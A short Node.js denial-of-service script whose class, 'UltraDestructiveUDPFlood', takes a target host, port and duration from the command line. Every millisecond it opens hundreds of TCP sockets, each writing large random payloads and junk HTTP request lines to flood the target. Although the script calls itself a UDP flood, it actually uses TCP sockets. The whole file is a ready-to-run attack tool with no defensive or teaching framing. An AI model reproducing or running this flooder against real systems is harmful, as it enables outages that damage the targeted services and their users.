const net = require('net');
const crypto = require('crypto');

class UltraDestructiveUDPFlood {
    constructor(target, port, duration) {
        this.target = target;
        this.port = port;
        this.duration = duration * 1000;
        this.startTime = Date.now();
    }

    generateUltraPayload() {
        return Buffer.concat([
            Buffer.from('KAVERNXYZ'),
            crypto.randomBytes(128 * 1024), 
            Buffer.from(`\r\nGETOUT: ${crypto.randomBytes(16).toString('hex')}\r\n`)
        ]);
    }

    createUltraConnection() {
        const socket = new net.Socket();
        
        socket.setTimeout(1);
        socket.setNoDelay(true);
        socket.setKeepAlive(true, 1);

        socket.connect(this.port, this.target, () => {
            for (let i = 0; i < 1000; i++) {
                socket.write(this.generateUltraPayload());
                socket.write(Buffer.from(`GET /${crypto.randomBytes(10).toString('hex')} HTTP/1.1\r\n`));
            }
            
            socket.setKeepAlive(true, 1);
        });

        socket.on('error', () => socket.destroy());
        socket.on('timeout', () => socket.destroy());
    }

    startUltraAttack() {
        console.log(`UDP FLOOD`);
        console.log(`Target: ${this.target}:${this.port}`);

        const attackInterval = setInterval(() => {
            if (Date.now() - this.startTime > this.duration) {
                clearInterval(attackInterval);
                process.exit(0);
            }

            for (let i = 0; i < 250; i++) {
                this.createUltraConnection();
            }
        }, 1);

        process.on('SIGINT', () => {
            clearInterval(attackInterval);
            process.exit(0);
        });
    }
}

const host = process.argv[2];
const port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);

const attack = new UltraDestructiveUDPFlood(host, port, duration);
attack.startUltraAttack();